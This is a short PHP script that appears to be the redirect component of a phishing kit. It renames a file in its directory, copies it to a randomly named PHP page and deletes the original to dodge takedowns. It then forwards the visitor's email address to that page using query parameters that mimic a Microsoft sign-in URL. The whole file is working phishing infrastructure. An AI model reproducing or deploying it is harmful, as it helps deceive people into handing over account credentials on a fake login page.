<?php

session_start();

include ('api.php');

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}

$oslo=rand(); 
$praga=md5($oslo);
$src = strtoupper("$praga");

$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "home.php");
}}}
$staticfile = "home.php";
$name =  generateRandomString();
$secfile = $name.".php";
if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
}else {
if(file_exists($secfile)){
//echo "file exist\n";
unlink($staticfile);
header("Location: $secfile?wa=wsignin1.0&rpsnv=13&ct=$oslo&rver=$praga&wp=MBI_SSL_SHARED&wreply=inbox&lc=1024&id=$src&mkt=en-us&cbcxt=mai&email=$email");
}}

//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>